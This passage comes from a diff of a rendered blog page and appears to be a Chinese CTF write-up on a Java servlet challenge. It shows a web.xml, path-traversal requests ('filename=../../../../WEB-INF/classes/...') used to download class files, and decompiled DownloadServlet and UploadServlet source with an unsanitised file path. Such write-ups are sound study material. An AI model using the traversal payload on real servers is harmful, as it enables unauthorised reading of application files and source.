class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/DownloadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/ListFileServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/UploadServlet<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>发现有上传和下载的配置文件，由2个类组成，将这2个类进行下载。分别访问&#96;&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet</p>
 <p>&#x2F;DownloadServlet.class<code>、</code>&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class<code>。使用</code>jd-gui.exe<code>分别进行反编译，其中</code>DownloadServlet.class&#96;源码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">    <span class="keyword">throws</span> ServletException, IOException</span><br><span class="line">  &#123;</span><br><span class="line">    doPost(request, response); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    fileName = <span class="keyword">new</span> <span class="title class_">String</span>(fileName.getBytes(<span class="string">&quot;ISO8859-1&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;filename=&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> ((fileName != <span class="literal">null</span>) &amp;&amp; (fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>))) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;禁止读取&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileSaveRootPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (!(file.exists())) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;您要下载的资源已被删除!&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward(request, response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">realname</span> <span class="operator">=</span> fileName.substring(fileName.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">      out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">    in.close();</span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> filename.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir1</span> <span class="operator">=</span> hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">dir2</span> <span class="operator">=</span> (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> saveRootPath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir);</span><br><span class="line">    <span class="keyword">if</span> (!(file.exists()))</span><br><span class="line">      file.mkdirs();</span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.abc.servlet;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> javax.servlet.RequestDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span><br>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>    <span class="hljs-keyword">throws</span> ServletException, IOException<br>  &#123;<br>    doPost(request, response); &#125;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>    fileName = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(fileName.getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> ((fileName != <span class="hljs-literal">null</span>) &amp;&amp; (fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>))) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;禁止读取&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileSaveRootPath</span> <span class="hljs-operator">=</span> getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> findFileSavePathByFileName(fileName, fileSaveRootPath);<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-keyword">if</span> (!(file.exists())) &#123;<br>      request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;您要下载的资源已被删除!&quot;</span>);<br>      request.getRequestDispatcher(<span class="hljs-string">&quot;/message.jsp&quot;</span>).forward(request, response);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">realname</span> <span class="hljs-operator">=</span> fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>    response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>      out.write(buffer, <span class="hljs-number">0</span>, len);<br>    in.close();<br>    out.close();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findFileSavePathByFileName</span><span class="hljs-params">(String filename, String saveRootPath)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> filename.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir1</span> <span class="hljs-operator">=</span> hashCode &amp; <span class="hljs-number">0xF</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">dir2</span> <span class="hljs-operator">=</span> (hashCode &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> saveRootPath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(dir);<br>    <span class="hljs-keyword">if</span> (!(file.exists()))<br>      file.mkdirs();<br>    <span class="hljs-keyword">return</span> dir;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><code>UploadServlet.class</code>源码如下:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileUploadException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.openxml4j.exceptions.InvalidFormatException;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Sheet;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.Workbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.WorkbookFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">    <span class="keyword">throws</span> ServletException, IOException</span><br><span class="line">  &#123;</span><br><span class="line">    doPost(request, response); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">savePath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">tempPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/temp&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">tempFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    <span class="keyword">if</span> (!(tempFile.exists()))</span><br><span class="line">      tempFile.mkdir();</span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">      factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">      factory.setRepository(tempFile);</span><br><span class="line">      <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line"></span><br><span class="line">      upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">      upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">      upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">      <span class="keyword">if</span> (!(ServletFileUpload.isMultipartContent(request)))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> upload.parseRequest(request);</span><br><span class="line">      <span class="type">Iterator</span> <span class="variable">localIterator</span> <span class="operator">=</span> list.iterator();</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123; FileItem fileItem;</span><br><span class="line">        String filename;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="keyword">do</span> &#123; String str;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="keyword">if</span> (!(localIterator.hasNext())) <span class="keyword">break</span> label438; fileItem = (FileItem)localIterator.next();</span><br><span class="line">              <span class="keyword">if</span> (!(fileItem.isFormField())) <span class="keyword">break</span>;</span><br><span class="line">              <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> fileItem.getFieldName();</span><br><span class="line">              str = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            filename = fileItem.getName(); &#125;</span><br><span class="line">          <span class="keyword">while</span> (filename == <span class="literal">null</span>); <span class="keyword">if</span> (!(filename.trim().equals(<span class="string">&quot;&quot;</span>))) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileExtName</span> <span class="operator">=</span> filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> ((filename.startsWith(<span class="string">&quot;excel-&quot;</span>)) &amp;&amp; (<span 